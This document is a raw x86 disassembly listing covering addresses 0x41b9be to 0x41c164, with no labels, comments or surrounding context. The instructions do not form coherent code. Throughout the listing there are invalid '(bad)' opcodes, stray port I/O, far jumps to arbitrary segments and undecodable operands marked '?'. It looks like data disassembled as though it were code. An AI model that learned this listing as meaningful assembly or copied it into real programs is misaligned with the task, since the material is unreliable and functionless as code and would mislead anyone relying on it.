  41b9be:	adc    al,0xa6
  41b9c0:	es jge 0x41b94c
  41b9c3:	(bad)  
  41b9c4:	mov    eax,ds:0xb887102b
  41b9c9:	dec    edi
  41b9ca:	int    0xf
  41b9cc:	dec    eax
  41b9cd:	push   cs
  41b9ce:	and    eax,0xac38a99e
  41b9d3:	jmp    0x41ba1d
  41b9d5:	mov    al,ds:0xf2931bde
  41b9da:	or     eax,0xdcd60209
  41b9df:	in     eax,0xb0
  41b9e1:	sub    cl,BYTE PTR [ecx+0x7f0c04c0]
  41b9e7:	fs cdq 
  41b9e9:	ret    0x9e82
  41b9ec:	dec    ecx
  41b9ed:	(bad)  
  41b9ee:	dec    esi
  41b9ef:	cld    
  41b9f0:	xor    al,BYTE PTR [ebx-0x4e]
  41b9f3:	push   ecx
  41b9f4:	and    DWORD PTR [ebp+eax*4-0x1a06dab1],esi
  41b9fb:	call   0x769fef43
  41ba00:	out    0xa6,eax
  41ba02:	jns    0x41b984
  41ba04:	pop    ecx
  41ba05:	outs   dx,BYTE PTR ds:[esi]
  41ba06:	mov    al,ds:0xbdf2d032
  41ba0b:	xlat   BYTE PTR gs:[ebx]
  41ba0d:	pop    eax
  41ba0e:	add    esp,DWORD PTR [edx]
  41ba10:	(bad)  
  41ba12:	sbb    BYTE PTR [edi-0x1574ca73],0xb9
  41ba19:	out    dx,al
  41ba1a:	mov    al,ds:0xb7a16088
  41ba1f:	push   ds
  41ba20:	cdq    
  41ba21:	push   0x97238663
  41ba26:	dec    ecx
  41ba27:	add    dl,BYTE PTR [esi-0x5bd19a3a]
  41ba2d:	cmp    eax,0x7868af30
  41ba32:	repnz add DWORD PTR [ebx],esi
  41ba35:	inc    ecx
  41ba36:	repz call 0x16a3dc92
  41ba3c:	loop   0x41b9f0
  41ba3e:	cwde   
  41ba3f:	dec    ebx
  41ba40:	or     eax,0x276c8149
  41ba45:	push   es
  41ba46:	pop    es
  41ba47:	push   esp
  41ba48:	jae    0x41ba92
  41ba4a:	stos   BYTE PTR es:[edi],al
  41ba4b:	xor    ch,ah
  41ba4d:	(bad)  
  41ba4e:	popf   
  41ba4f:	dec    esi
  41ba50:	sbb    BYTE PTR [eax+0x63],dh
  41ba53:	std    
  41ba54:	stos   BYTE PTR es:[edi],al
  41ba55:	(bad)  
  41ba57:	push   edx
  41ba58:	adc    al,0x2e
  41ba5a:	mov    dh,BYTE PTR [ebp+0x6561b1b2]
  41ba60:	xor    BYTE PTR [esi],cl
  41ba62:	pushf  
  41ba63:	icebp  
  41ba64:	and    al,0x7b
  41ba66:	stc    
  41ba67:	mov    esi,0xc66f3acf
  41ba6c:	adc    esp,DWORD PTR [esi+0x3e]
  41ba6f:	adc    ebx,DWORD PTR [ebx-0x5e06dd92]
  41ba75:	pusha  
  41ba76:	jbe    0x41baeb
  41ba78:	dec    esi
  41ba79:	push   0xd2884893
  41ba7e:	imul   BYTE PTR [eax-0x4f7bf901]
  41ba84:	xchg   ecx,eax
  41ba85:	mov    eax,ds:0x524322ab
  41ba8a:	gs aaa 
  41ba8c:	add    ecx,0x76
  41ba8f:	sub    dh,ch
  41ba91:	push   ebx
  41ba92:	ins    DWORD PTR es:[edi],dx
  41ba93:	lahf   
  41ba94:	stos   DWORD PTR es:[edi],eax
  41ba95:	hlt    
  41ba96:	test   al,0x69
  41ba98:	dec    eax
  41ba99:	std    
  41ba9a:	mov    ds:0xf0817989,al
  41ba9f:	jg     0x41ba78
  41baa1:	cmp    edx,esi
  41baa3:	sahf   
  41baa4:	add    eax,0x50ca026a
  41baa9:	cmp    al,0x39
  41baab:	cmc    
  41baac:	sbb    eax,0xff6f9439
  41bab1:	push   0x3cd1e897
  41bab6:	mov    ecx,0x81132182
  41babb:	sbb    al,0xec
  41babd:	mov    al,0x66
  41babf:	pusha  
  41bac0:	cmp    al,0xdb
  41bac2:	loop   0x41ba98
  41bac4:	aam    0x77
  41bac6:	push   edi
  41bac7:	xor    eax,0xb0ea4c00
  41bacc:	inc    ebp
  41bacd:	push   edx
  41bace:	dec    esp
  41bacf:	rol    DWORD PTR [eax],1
  41bad1:	cmp    eax,0xd371fb6c
  41bad6:	loop   0x41bb46
  41bad8:	or     edi,DWORD PTR [ecx+0x60]
  41badb:	dec    esi
  41badc:	fsub   QWORD PTR [esp+edi*8+0x488b8d5c]
  41bae3:	scas   eax,DWORD PTR es:[edi]
  41bae4:	dec    ecx
  41bae5:	in     al,dx
  41bae6:	adc    eax,0xb477c830
  41baeb:	ja     0x41bafe
  41baed:	(bad)  
  41baee:	or     DWORD PTR [edi-0x1d],esp
  41baf1:	mov    WORD PTR [edx-0x3b9f04c3],ds
  41baf7:	and    eax,0xd5cdd0db
  41bafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bafd:	mov    ebx,0x552b3106
  41bb02:	sahf   
  41bb03:	jp     0x41bb2d
  41bb05:	push   ecx
  41bb06:	fcomp  DWORD PTR [ecx+0x29]
  41bb09:	xchg   edx,eax
  41bb0a:	hlt    
  41bb0b:	repz aam 0x7f
  41bb0e:	sub    eax,edi
  41bb10:	inc    ebx
  41bb11:	sub    DWORD PTR [edi+eiz*8+0x771ecbf2],esi
  41bb18:	sub    eax,0x67a8ce76
  41bb1d:	nop
  41bb1e:	add    al,0xc2
  41bb20:	cmp    cl,al
  41bb22:	test   eax,0xee5676f7
  41bb27:	xor    esi,DWORD PTR [edx-0x71]
  41bb2a:	xor    dl,BYTE PTR [edx+0xb41381f]
  41bb30:	fistp  WORD PTR [edx-0x7801dc3c]
  41bb36:	jne    0x41bb21
  41bb38:	xor    eax,0x7f749b36
  41bb3d:	and    BYTE PTR [edi+ecx*1+0x1b],0xc2
  41bb42:	out    dx,al
  41bb43:	xor    bh,ah
  41bb45:	into   
  41bb46:	mov    ebx,edx
  41bb48:	in     al,0x27
  41bb4a:	inc    esp
  41bb4b:	in     eax,dx
  41bb4c:	cmp    ebx,DWORD PTR [edx]
  41bb4e:	shl    BYTE PTR ds:0x8495d4d0,cl
  41bb54:	jmp    0xd42eb433
  41bb59:	push   esp
  41bb5a:	pop    ds
  41bb5b:	push   eax
  41bb5c:	push   ebx
  41bb5d:	scas   al,BYTE PTR es:[edi]
  41bb5e:	jmp    0x7cea:0xc765f2b
  41bb65:	mov    edi,0x46e44e34
  41bb6a:	sti    
  41bb6b:	cmp    DWORD PTR [esi-0xa5b060f],esi
  41bb71:	inc    ecx
  41bb72:	push   edi
  41bb73:	mov    esi,0x5bdf54b9
  41bb78:	mov    eax,0x5b698198
  41bb7d:	(bad)  [ebx+0x4f]
  41bb80:	pop    ss
  41bb81:	shl    BYTE PTR [ebx+0x1aaed4e5],0xd3
  41bb88:	add    DWORD PTR [esp+eiz*4+0x7d],edi
  41bb8c:	pop    es
  41bb8d:	lahf   
  41bb8e:	lds    edi,FWORD PTR [ebp+0x2d]
  41bb91:	mov    esi,0xa78cccd3
  41bb96:	jmp    0xfd88:0xaa3d1bab
  41bb9d:	mov    edi,fs
  41bb9f:	pop    edx
  41bba0:	xchg   esi,eax
  41bba1:	pop    ebp
  41bba2:	retf   0xe617
  41bba5:	popa   
  41bba6:	lds    esp,FWORD PTR [esi-0x57]
  41bba9:	xchg   esp,eax
  41bbaa:	inc    ebp
  41bbab:	das    
  41bbac:	jg     0x41bc2a
  41bbae:	ins    DWORD PTR es:[edi],dx
  41bbaf:	jge    0x41bb36
  41bbb1:	jb     0x41bb36
  41bbb3:	rol    DWORD PTR [edx+edx*1-0x41c5e88d],0x6e
  41bbbb:	int    0x3b
  41bbbd:	enter  0x4a42,0xa8
  41bbc1:	cdq    
  41bbc2:	jp     0x41bc30
  41bbc4:	mov    edx,0x679c070d
  41bbc9:	enter  0x3a9f,0x1f
  41bbcd:	loop   0x41bbf9
  41bbcf:	xchg   DWORD PTR ss:[ecx+0x12],eax
  41bbd3:	icebp  
  41bbd4:	je     0x41bbad
  41bbd6:	dec    esi
  41bbd7:	not    DWORD PTR [ecx-0x77]
  41bbda:	jb     0x41bb80
  41bbdc:	or     al,0xd2
  41bbde:	outs   dx,BYTE PTR ds:[esi]
  41bbdf:	add    DWORD PTR [edx-0x11],ecx
  41bbe2:	add    ch,ah
  41bbe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbe5:	add    eax,0xeec7c8a8
  41bbea:	and    eax,0xc505e286
  41bbef:	inc    eax
  41bbf0:	push   edx
  41bbf1:	icebp  
  41bbf2:	xor    al,BYTE PTR [eax]
  41bbf4:	inc    esp
  41bbf5:	add    edx,0xf41c4306
  41bbfb:	ins    DWORD PTR es:[edi],dx
  41bbfc:	mov    ?,WORD PTR [ebp-0x5c21ff69]
  41bc02:	sub    al,0xfd
  41bc04:	in     eax,0x98
  41bc06:	out    0x5a,al
  41bc08:	daa    
  41bc09:	aas    
  41bc0a:	or     bh,BYTE PTR [ebx-0x4d7768ac]
  41bc10:	xor    al,0xef
  41bc12:	arpl   WORD PTR [edi+0x15],bx
  41bc15:	jae    0x41bc8f
  41bc17:	mov    BYTE PTR [edx-0x27],0x68
  41bc1b:	lods   al,BYTE PTR fs:[esi]
  41bc1d:	rcl    DWORD PTR [ebx],cl
  41bc1f:	scas   al,BYTE PTR es:[edi]
  41bc20:	xor    al,ch
  41bc22:	sbb    ah,BYTE PTR [eax-0x5815f0f6]
  41bc28:	mov    es,WORD PTR [edx+0x66f74406]
  41bc2e:	lea    ebp,[ebx+0x5a]
  41bc31:	jecxz  0x41bc81
  41bc33:	mov    DWORD PTR [edi+0x73],edi
  41bc36:	in     eax,0x8f
  41bc38:	nop
  41bc39:	or     eax,0xb4b4a7af
  41bc3e:	sub    ebp,DWORD PTR [edx+ecx*8-0x21]
  41bc42:	cmp    edi,DWORD PTR [ebp+0x7a]
  41bc45:	xchg   esi,eax
  41bc46:	fmul   DWORD PTR [edx]
  41bc48:	dec    esi
  41bc49:	xor    ebp,DWORD PTR [edi-0x3647fd08]
  41bc4f:	fwait
  41bc50:	sub    ah,BYTE PTR [eax+0x32]
  41bc53:	xchg   esi,eax
  41bc54:	lds    esp,FWORD PTR [ebx-0x51]
  41bc57:	idiv   BYTE PTR [ebx-0x49edf235]
  41bc5d:	sbb    eax,0xcb35e827
  41bc62:	ret    0xe168
  41bc65:	inc    ecx
  41bc66:	xchg   DWORD PTR [esi-0x7e979e42],ebx
  41bc6c:	bound  ebp,QWORD PTR [esi+edx*1-0x7f085300]
  41bc73:	mov    ecx,0x83534bea
  41bc78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc79:	out    dx,al
  41bc7a:	or     eax,0xca50ba93
  41bc7f:	mov    edi,DWORD PTR [eax-0xf]
  41bc82:	icebp  
  41bc83:	sti    
  41bc84:	push   ebp
  41bc85:	inc    ecx
  41bc86:	jg     0x41bcaf
  41bc88:	(bad)  
  41bc89:	gs and bh,al
  41bc8c:	fsubp  st(0),st
  41bc8e:	mov    edx,DWORD PTR [ebx]
  41bc90:	xor    BYTE PTR [ecx+0x48e31ad8],dl
  41bc96:	fcomp  QWORD PTR [edx-0x2b]
  41bc99:	outs   dx,BYTE PTR ds:[esi]
  41bc9a:	pop    eax
  41bc9b:	inc    esp
  41bc9c:	sbb    eax,0x48e8288e
  41bca1:	(bad)  
  41bca2:	loop   0x41bc59
  41bca4:	add    DWORD PTR [ecx+0x394d9564],esp
  41bcaa:	aas    
  41bcab:	xlat   BYTE PTR ds:[ebx]
  41bcac:	cmp    esi,DWORD PTR [edx+0x1f]
  41bcaf:	ins    DWORD PTR es:[edi],dx
  41bcb0:	jne    0x41bccc
  41bcb2:	lahf   
  41bcb3:	sub    al,BYTE PTR [edi]
  41bcb5:	jl     0x41bcfe
  41bcb7:	and    al,0x6a
  41bcb9:	test   DWORD PTR [edx],eax
  41bcbb:	mov    al,0xeb
  41bcbd:	and    BYTE PTR [ecx+0x59],bl
  41bcc0:	outs   dx,BYTE PTR ds:[esi]
  41bcc1:	ds fsub st,st(2)
  41bcc4:	add    eax,0x4edc5df5
  41bcc9:	sbb    eax,0x4938918c
  41bcce:	retf   0x1abe
  41bcd1:	inc    ebp
  41bcd2:	push   edx
  41bcd3:	retf   
  41bcd4:	jmp    FWORD PTR [esi+ecx*8-0x24e034df]
  41bcdb:	mov    al,ds:0xf4dbe1b3
  41bce0:	shl    DWORD PTR [edi-0x1e72adef],0xed
  41bce7:	cmp    eax,DWORD PTR [edx-0x4ece6450]
  41bced:	inc    ebp
  41bcee:	jmp    DWORD PTR [esi+0x60]
  41bcf1:	mov    ds:0xfb80f311,eax
  41bcf6:	ja     0x41bd35
  41bcf8:	out    0x7a,eax
  41bcfa:	sub    eax,0x80a5abb8
  41bcff:	xchg   edi,eax
  41bd00:	and    bh,BYTE PTR [ebx-0x7f]
  41bd03:	addr16 pop ss
  41bd05:	test   eax,0xdd5f22ca
  41bd0a:	mov    dh,0x2a
  41bd0c:	call   0x85a9:0x300f4e1a
  41bd13:	dec    ecx
  41bd14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd15:	inc    ebx
  41bd16:	hlt    
  41bd17:	pop    esi
  41bd18:	int    0x2c
  41bd1a:	outs   dx,DWORD PTR ds:[esi]
  41bd1b:	xor    dh,cl
  41bd1d:	sar    DWORD PTR [ebp-0x382a2fcf],1
  41bd23:	adc    dh,BYTE PTR [esp+ebx*4-0x320b7966]
  41bd2a:	and    eax,0xc8d6c7fb
  41bd2f:	xor    eax,0x35100c5f
  41bd34:	loop   0x41bd91
  41bd36:	and    dl,BYTE PTR [edi-0x57]
  41bd39:	aam    0x79
  41bd3b:	scas   eax,DWORD PTR es:[edi]
  41bd3c:	pop    eax
  41bd3d:	pushf  
  41bd3e:	xchg   ebx,eax
  41bd3f:	inc    esi
  41bd40:	inc    edx
  41bd41:	loopne 0x41bd06
  41bd43:	sti    
  41bd44:	scas   eax,DWORD PTR es:[edi]
  41bd45:	inc    edx
  41bd46:	dec    esp
  41bd47:	xchg   ebx,eax
  41bd48:	push   0x3dd8525b
  41bd4d:	out    dx,al
  41bd4e:	add    eax,0x1cfe5f51
  41bd53:	mov    edi,ecx
  41bd55:	mov    edi,0x3443eccd
  41bd5a:	ins    DWORD PTR es:[edi],dx
  41bd5b:	fstp   TBYTE PTR [ebx-0x6c61fa42]
  41bd61:	pop    ss
  41bd62:	into   
  41bd63:	call   0x69540c9c
  41bd68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd69:	test   eax,0xbf5d5e75
  41bd6e:	mov    edi,0xa2a7fbc0
  41bd73:	and    al,0x5a
  41bd75:	js     0x41bd49
  41bd77:	cmp    al,0xfc
  41bd79:	push   0x67e8652e
  41bd7e:	outs   dx,DWORD PTR ds:[esi]
  41bd7f:	ficom  DWORD PTR [ebp+0x78]
  41bd82:	ja     0x41bda8
  41bd84:	mov    cl,0xd1
  41bd86:	(bad)
  41bd8a:	push   edx
  41bd8b:	mov    edx,0x510c3d60
  41bd90:	js     0x41bd98
  41bd92:	adc    BYTE PTR [ecx+0x2e],cl
  41bd95:	dec    ebp
  41bd96:	and    al,BYTE PTR [eax]
  41bd98:	test   al,0xfa
  41bd9a:	adc    BYTE PTR [ebp+0x71],0xed
  41bd9e:	cmc    
  41bd9f:	ret    0xb594
  41bda2:	mov    ds:0x47f3e435,eax
  41bda7:	or     bl,dh
  41bda9:	cmp    BYTE PTR [ebp+0x66c9c090],al
  41bdaf:	ret    0xf026
  41bdb2:	pop    esp
  41bdb3:	sub    eax,0xfd3f5a59
  41bdb8:	inc    edx
  41bdb9:	shl    DWORD PTR [esi+edx*1],0xe7
  41bdbd:	xchg   DWORD PTR [edi+0x7c],esi
  41bdc0:	ffree  st(4)
  41bdc2:	cmp    DWORD PTR [ebx+0x6],eax
  41bdc5:	sbb    al,0x4c
  41bdc7:	les    edx,FWORD PTR [ecx-0x4877f234]
  41bdcd:	imul   ebp,ecx,0x84dd914d
  41bdd3:	add    DWORD PTR cs:[ebp+0x35266faa],ebx
  41bdda:	gs push ds
  41bddc:	add    ebx,ebp
  41bdde:	mov    ch,0xca
  41bde0:	call   0x3865:0x8862e615
  41bde7:	sub    eax,DWORD PTR [esi+0x15]
  41bdea:	shr    esi,0x34
  41bded:	popa   
  41bdee:	push   esp
  41bdef:	pop    edi
  41bdf0:	xchg   ecx,eax
  41bdf1:	inc    ebx
  41bdf2:	jno    0x41bd79
  41bdf4:	sbb    eax,0xe33ae1f9
  41bdf9:	mov    ebx,0x140c7ba8
  41bdfe:	jmp    0x74f31c14
  41be03:	pusha  
  41be04:	lahf   
  41be05:	stc    
  41be06:	sahf   
  41be07:	lds    edx,FWORD PTR ds:0x7d93d25c
  41be0d:	enter  0x2ef5,0x2e
  41be11:	imul   ebx,edi,0x71
  41be14:	clc    
  41be15:	fild   QWORD PTR [edi-0x52]
  41be18:	dec    esi
  41be19:	mov    eax,DWORD PTR ds:0xd12e4cd9
  41be1f:	rol    DWORD PTR [esi],0x14
  41be22:	mov    ch,0x57
  41be24:	mov    ah,0x3b
  41be26:	inc    eax
  41be27:	mov    al,ds:0x5f6aa753
  41be2c:	xchg   ebp,eax
  41be2d:	arpl   WORD PTR [ebx-0x13],sp
  41be30:	cmp    al,0x37
  41be32:	jg     0x41bdf1
  41be34:	xor    ebx,ecx
  41be36:	loop   0x41be42
  41be38:	fist   WORD PTR [edx-0x4]
  41be3b:	pushf  
  41be3c:	loopne 0x41be4f
  41be3e:	cmp    al,bh
  41be40:	out    0xbb,eax
  41be42:	out    dx,eax
  41be43:	adc    al,0xb5
  41be45:	shr    bl,0x3d
  41be48:	loopne 0x41be21
  41be4a:	sbb    BYTE PTR [eax-0x45891a81],ch
  41be50:	loope  0x41be21
  41be52:	sahf   
  41be53:	jo     0x41be51
  41be55:	cdq    
  41be56:	fcom   QWORD PTR [eax-0x34f4d044]
  41be5c:	push   edx
  41be5d:	stos   DWORD PTR es:[edi],eax
  41be5e:	and    ah,dh
  41be60:	jecxz  0x41be5b
  41be62:	mov    ch,0x96
  41be64:	jg     0x41be9e
  41be66:	dec    ecx
  41be67:	es in  eax,0x7f
  41be6a:	ins    DWORD PTR es:[edi],dx
  41be6b:	inc    ebx
  41be6c:	sub    BYTE PTR [esi+eiz*1+0x253ea450],bh
  41be73:	xor    eax,0xd1b484eb
  41be78:	stc    
  41be79:	mov    dl,0x86
  41be7b:	gs adc al,0x83
  41be7e:	call   0x722:0xd5c6ebea
  41be85:	cli    
  41be86:	(bad)  
  41be87:	mov    dl,0x1e
  41be89:	pop    es
  41be8a:	rcr    DWORD PTR [edi],0xae
  41be8d:	or     BYTE PTR [eax+0x55a20a89],bh
  41be93:	inc    esi
  41be94:	iret   
  41be95:	fmul   QWORD PTR [edx-0x1913e1fa]
  41be9b:	cli    
  41be9c:	lock cld 
  41be9e:	test   al,0xa3
  41bea0:	dec    ebx
  41bea1:	es mov ch,0x8e
  41bea4:	call   0x57b2:0x6079bfd1
  41beab:	inc    ebp
  41beac:	outs   dx,BYTE PTR ds:[esi]
  41bead:	std    
  41beae:	sbb    eax,edx
  41beb0:	sbb    eax,DWORD PTR [eax-0x42]
  41beb3:	sahf   
  41beb4:	dec    edx
  41beb5:	add    BYTE PTR [ebx],0x48
  41beb8:	sub    al,0xbe
  41beba:	pop    ebx
  41bebb:	jnp    0x41be5f
  41bebd:	inc    esp
  41bebe:	test   DWORD PTR [edi],ebp
  41bec0:	and    al,0xd2
  41bec2:	mov    al,ds:0x5100f78b
  41bec7:	or     eax,0x68668418
  41becc:	mov    edx,0x9f1cf92f
  41bed1:	or     eax,DWORD PTR [eax+0x300a2554]
  41bed7:	add    esp,DWORD PTR [ebp+0x3c]
  41beda:	mov    bh,0x2f
  41bedc:	and    BYTE PTR [esi-0x5acee331],ah
  41bee2:	imul   ebp,edx,0xa05484bb
  41bee8:	xchg   edi,eax
  41bee9:	and    al,0x82
  41beeb:	into   
  41beec:	div    al
  41beee:	xchg   edi,eax
  41beef:	cmp    al,0xf2
  41bef1:	sti    
  41bef2:	repz inc esi
  41bef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef5:	shl    BYTE PTR [eax+0x5a],cl
  41bef8:	xor    ah,BYTE PTR [eax+eiz*4-0x3d]
  41befc:	or     al,0x32
  41befe:	sbb    bl,al
  41bf00:	ja     0x41bef1
  41bf02:	adc    al,0x56
  41bf04:	mov    eax,0xa046aed1
  41bf09:	fisub  DWORD PTR [esi+ebx*2-0xd96b45e]
  41bf10:	inc    edx
  41bf11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf12:	imul   ecx,edx,0xa8818171
  41bf18:	cmp    eax,0xf4a54552
  41bf1d:	daa    
  41bf1e:	dec    ecx
  41bf1f:	mul    BYTE PTR ss:[edx+0x4ee81699]
  41bf26:	in     eax,dx
  41bf27:	push   esp
  41bf28:	cmp    al,0x5
  41bf2a:	fs jns 0x41bedf
  41bf2d:	pop    edi
  41bf2e:	in     eax,0x25
  41bf30:	test   al,0x41
  41bf32:	shl    BYTE PTR [ebx],1
  41bf34:	adc    DWORD PTR [eax-0x3a2772a1],ecx
  41bf3a:	xor    edi,0xffffff94
  41bf3d:	mov    ebp,0xe483d26a
  41bf42:	inc    ebx
  41bf43:	fistp  WORD PTR [ebp-0x1200a2fa]
  41bf49:	pop    edx
  41bf4a:	fidiv  DWORD PTR [ecx-0x62]
  41bf4d:	jno    0x41beec
  41bf4f:	sub    ebx,ebp
  41bf51:	or     dh,BYTE PTR [esi]
  41bf53:	mov    BYTE PTR [edx+0x3b],0xb1
  41bf57:	ja     0x41bf40
  41bf59:	jecxz  0x41bf2d
  41bf5b:	or     eax,0x1f6d7ef7
  41bf60:	xchg   ebp,eax
  41bf61:	sub    BYTE PTR [eax+0x1a1280e5],bl
  41bf67:	mov    esi,0x5b885fa8
  41bf6c:	jns    0x41bf24
  41bf6e:	mov    DWORD PTR [esi-0x2e],ebx
  41bf71:	add    al,BYTE PTR [edi-0x31]
  41bf74:	shr    DWORD PTR [edi],0x3c
  41bf77:	cmp    cl,cl
  41bf79:	lods   eax,DWORD PTR ds:[esi]
  41bf7a:	loopne 0x41bf7e
  41bf7c:	lahf   
  41bf7d:	inc    esi
  41bf7e:	and    ebx,DWORD PTR [edi]
  41bf80:	mov    edx,0xf6b7545b
  41bf85:	push   ds
  41bf86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf87:	(bad)  
  41bf88:	mov    cl,0x57
  41bf8a:	adc    bh,0x45
  41bf8d:	adc    DWORD PTR [esi-0x35d4aee8],0x361d3d29
  41bf97:	aam    0xf0
  41bf99:	pop    edx
  41bf9a:	pop    ebp
  41bf9b:	push   0x48e6e5e3
  41bfa0:	dec    ebp
  41bfa1:	popf   
  41bfa2:	test   al,0x1f
  41bfa4:	out    0xb8,eax
  41bfa6:	mov    bl,0xea
  41bfa8:	jae    0x41bf50
  41bfaa:	lds    esi,FWORD PTR [eax+0x673ac665]
  41bfb0:	imul   edx,edi,0x9ba053ef
  41bfb6:	xchg   edx,eax
  41bfb7:	push   esi
  41bfb8:	jmp    0x41bff2
  41bfba:	leave  
  41bfbb:	lock sub eax,DWORD PTR [esi]
  41bfbe:	push   eax
  41bfbf:	push   eax
  41bfc0:	or     al,0x69
  41bfc2:	lods   eax,DWORD PTR ds:[esi]
  41bfc3:	mov    WORD PTR [edi-0x7d0c6a70],cs
  41bfc9:	into   
  41bfca:	lds    esi,FWORD PTR [edx+0x77b0a9c7]
  41bfd0:	push   ds
  41bfd1:	push   0x72
  41bfd3:	add    BYTE PTR [edx+0x31fe379f],cl
  41bfd9:	pop    eax
  41bfda:	dec    BYTE PTR [edi+0x5c5a98bf]
  41bfe0:	adc    ah,bh
  41bfe2:	mov    WORD PTR [ebx+0x460cde7e],?
  41bfe8:	push   0x7f
  41bfea:	cs repz test BYTE PTR ds:[ecx+0x1c],al
  41bff0:	call   0x2c6c:0x52c50aeb
  41bff7:	push   eax
  41bff8:	enter  0xe6be,0x64
  41bffc:	nop
  41bffd:	mov    esi,0x1e9b18b9
  41c002:	pop    ss
  41c003:	add    eax,0x1e6178f4
  41c008:	js     0x41c074
  41c00a:	sbb    DWORD PTR [edx+ebx*4+0x7953a2db],0xd55329d1
  41c015:	aad    0x9b
  41c017:	cmc    
  41c018:	scas   al,BYTE PTR es:[edi]
  41c019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c01a:	enter  0x22a9,0x8d
  41c01e:	hlt    
  41c01f:	cmp    ecx,DWORD PTR [esi]
  41c021:	fmul   QWORD PTR [edi+0x5f9d4054]
  41c027:	mov    dh,0x77
  41c029:	mov    ch,0x19
  41c02b:	pushf  
  41c02c:	mov    edx,0xb104aa22
  41c031:	xor    ch,bl
  41c033:	cmp    BYTE PTR ds:0xde1325ed,dh
  41c039:	sti    
  41c03a:	and    BYTE PTR [eax-0x24b67b51],bl
  41c040:	arpl   WORD PTR [eax+edi*4+0x6fbe8088],ax
  41c047:	inc    eax
  41c048:	inc    ecx
  41c049:	cmp    al,0x1d
  41c04b:	add    eax,0xa78502df
  41c050:	mov    eax,ds:0x864eb505
  41c055:	jns    0x41c005
  41c057:	retf   
  41c058:	lods   eax,DWORD PTR ds:[esi]
  41c059:	inc    edi
  41c05a:	mov    bl,0xb
  41c05c:	je     0x41c070
  41c05e:	outs   dx,BYTE PTR ds:[esi]
  41c05f:	push   esi
  41c060:	adc    eax,DWORD PTR [ebx-0x8500a59]
  41c066:	lods   eax,DWORD PTR ds:[esi]
  41c067:	iret   
  41c068:	mov    bh,0x54
  41c06a:	cli    
  41c06b:	sbb    al,BYTE PTR [ecx-0x47dd4688]
  41c071:	sbb    al,0xd4
  41c073:	jne    0x41c097
  41c075:	xchg   ebp,eax
  41c076:	pushf  
  41c077:	xchg   esi,eax
  41c078:	into   
  41c079:	mov    ecx,0x507db915
  41c07e:	fnstenv ss:[edi+0x7e2f357a]
  41c085:	fwait
  41c086:	dec    ebp
  41c087:	pop    ds
  41c088:	or     BYTE PTR [esi+0x69],dl
  41c08b:	mov    edi,0x366a8e3b
  41c090:	adc    al,0xb8
  41c092:	out    dx,eax
  41c093:	pop    edx
  41c094:	xchg   esp,eax
  41c095:	adc    edx,DWORD PTR [edi]
  41c097:	pop    ecx
  41c098:	fwait
  41c099:	mov    dl,0xe7
  41c09b:	in     eax,0x1a
  41c09d:	clc    
  41c09e:	mov    ah,0x7a
  41c0a0:	sahf   
  41c0a1:	cwde   
  41c0a2:	mov    ebp,0xc6ff7e6a
  41c0a7:	pop    esi
  41c0a8:	test   al,0xf8
  41c0aa:	jnp    0x41c097
  41c0ac:	hlt    
  41c0ad:	add    eax,0x726f94a
  41c0b2:	pop    ss
  41c0b3:	xchg   esi,eax
  41c0b4:	dec    ecx
  41c0b5:	and    eax,0x5341d840
  41c0ba:	mov    ah,BYTE PTR [esi]
  41c0bc:	and    edi,DWORD PTR [ecx-0x2d]
  41c0bf:	dec    eax
  41c0c0:	in     eax,dx
  41c0c1:	adc    ecx,DWORD PTR [esi]
  41c0c3:	xchg   esi,eax
  41c0c4:	dec    esp
  41c0c5:	xlat   BYTE PTR ds:[ebx]
  41c0c6:	repz jnp 0x41c0fa
  41c0c9:	adc    eax,DWORD PTR [ebp+ebx*2-0x7c1bfaa1]
  41c0d0:	lds    ebx,FWORD PTR [ecx]
  41c0d2:	sbb    bh,BYTE PTR [ecx+eax*2]
  41c0d5:	(bad)  
  41c0d6:	lock outs dx,BYTE PTR ds:[esi]
  41c0d8:	and    eax,0x9ae34d6
  41c0dd:	outs   dx,DWORD PTR ds:[esi]
  41c0de:	addr16 (bad) 
  41c0e0:	mov    eax,ds:0xc5ab5372
  41c0e5:	mov    bh,0x6c
  41c0e7:	js     0x41c0e1
  41c0e9:	in     al,dx
  41c0ea:	lock call 0x1ab46b11
  41c0f0:	iret   
  41c0f1:	out    dx,eax
  41c0f2:	test   al,0x3b
  41c0f4:	push   ebx
  41c0f5:	fucomip st,st(7)
  41c0f7:	add    edi,ebx
  41c0f9:	ret    0xe4df
  41c0fc:	hlt    
  41c0fd:	cmp    dh,BYTE PTR [edi]
  41c0ff:	cmp    dh,BYTE PTR [edi-0x7ffc8a5e]
  41c105:	lds    edx,FWORD PTR [esi]
  41c107:	mov    esp,0x9963890c
  41c10c:	mov    dh,ch
  41c10e:	lea    edi,[edi+0x601c62f]
  41c114:	jnp    0x41c177
  41c116:	xchg   ecx,eax
  41c117:	aaa    
  41c118:	adc    al,BYTE PTR [ebx]
  41c11a:	popa   
  41c11b:	sub    eax,0xd2349d52
  41c120:	mov    al,ds:0x5fe053a3
  41c125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c126:	mov    ecx,0xf0c88af1
  41c12b:	cs pop edi
  41c12d:	dec    esi
  41c12e:	and    dl,BYTE PTR [ebx]
  41c130:	(bad)  
  41c132:	(bad)  
  41c133:	in     eax,0x1d
  41c135:	mov    eax,0x66859819
  41c13a:	xchg   ebp,eax
  41c13b:	(bad)  
  41c13c:	push   ds
  41c13d:	jno    0x41c1a3
  41c13f:	mov    BYTE PTR [esi+eiz*1-0x22af9ca1],cl
  41c146:	lds    esp,FWORD PTR [esi]
  41c148:	xchg   ecx,eax
  41c149:	es in  al,0x96
  41c14c:	test   BYTE PTR [ecx-0x4b],0x12
  41c150:	fstp   QWORD PTR [edx-0xc]
  41c153:	mov    fs,WORD PTR [ecx+0x24]
  41c156:	(bad)  
  41c157:	cmp    BYTE PTR [ebp-0x4c0ec16a],al
  41c15d:	push   ecx
  41c15e:	push   ebx
  41c15f:	sub    esi,DWORD PTR [eax+0x25]
  41c162:	out    0x8e,eax
  41c164:	add    esp,edi
